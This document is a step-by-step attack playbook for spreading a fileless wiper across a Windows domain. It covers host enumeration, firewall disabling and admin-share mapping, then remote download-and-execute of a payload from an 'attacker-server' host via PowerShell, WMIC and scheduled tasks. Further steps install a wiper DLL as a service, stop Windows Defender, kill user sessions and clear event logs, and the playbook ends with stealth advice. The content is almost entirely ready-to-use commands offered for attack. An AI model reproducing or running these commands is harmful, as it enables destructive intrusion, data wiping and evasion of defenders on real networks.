

# Fileless Wiper Lateral Movement & Execution Workflow

---

### **Phase 1: Recon & Target Enumeration**

1. **Enumerate accessible hosts on the network:**

   ```cmd
   net view /domain
   ```
2. **Enumerate users and groups on remote host:**

   ```cmd
   net user /domain
   net localgroup administrators /domain
   ```
3. **Check open SMB shares and access:**

   ```cmd
   net view \\targetHost
   net use \\targetHost\ADMIN$ /user:domain\adminUser Password123
   ```

---

### **Phase 2: Network Preparation & Firewall Manipulation**

1. **Open required ports (e.g., SMB TCP 445) remotely:**

   ```cmd
   netsh advfirewall firewall add rule name="AllowWiper" dir=in action=allow protocol=TCP localport=445
   ```
2. **Optionally disable Windows Firewall during attack window:**

   ```cmd
   netsh advfirewall set allprofiles state off
   ```
3. **(Optional) Add stealthy firewall rules post-attack to maintain access:**

   ```cmd
   netsh advfirewall firewall add rule name="Allow SMB" dir=in action=allow protocol=TCP localport=445
   ```

---

### **Phase 3: Credential Use & Drive Mapping**

1. **Map remote admin share for lateral command execution:**

   ```cmd
   net use Z: \\targetHost\ADMIN$ /user:domain\adminUser Password123
   ```
2. **Verify access with mapped drive:**

   ```cmd
   dir Z:\
   ```

---

### **Phase 4: Fileless Payload Deployment via PowerShell Remoting or WMI**

1. **Invoke a reflective PowerShell payload in-memory on the remote host:**

   ```powershell
   Invoke-Command -ComputerName targetHost -ScriptBlock {
     IEX (New-Object Net.WebClient).DownloadString('http://attacker-server/payload.ps1')
   } -Credential (Get-Credential)
   ```
2. **Alternatively, use WMI to execute commands remotely:**

   ```cmd
   wmic /node:targetHost process call create "powershell -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://attacker-server/payload.ps1')"
   ```

---

### **Phase 5: Service Control via `net` & `sc`**

1. **Create and start a service to load reflective DLL payload in-memory:**

   ```cmd
   sc \\targetHost create WiperService binPath= "rundll32.exe C:\Windows\Temp\wiper.dll,EntryPoint"
   sc \\targetHost start WiperService
   ```
2. **Stop defender or AV services remotely to avoid detection:**

   ```cmd
   net stop "Windows Defender Antivirus Service"
   ```
3. **Kill active user sessions to lock users out:**

   ```cmd
   net session \\targetHost /delete
   ```

---

### **Phase 6: Cleanup and Persistence**

1. **Restore firewall to less suspicious state:**

   ```cmd
   netsh advfirewall reset
   ```
2. **Schedule lateral moves or payload execution for persistence:**

   ```cmd
   schtasks /Create /S targetHost /SC ONLOGON /TN "WiperTask" /TR "powershell -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://attacker-server/payload.ps1')" /RU SYSTEM
   ```
3. **Clear event logs remotely:**

   ```powershell
   Invoke-Command -ComputerName targetHost -ScriptBlock { wevtutil cl Security; wevtutil cl System; wevtutil cl Application }
   ```

---

### **Key Considerations**

* **Payload delivery is purely in-memory** — no executable or DLL is permanently dropped to disk.
* Use **native signed binaries (`net`, `netsh`, `sc`, `powershell`, `wmic`) only** for stealth.
* **Throttle lateral movement and randomize host targeting** to reduce detection likelihood.
* Use **valid domain credentials** or escalate privileges beforehand.
* Monitor network and endpoint logs if possible, then adjust firewall rules and execution timings.

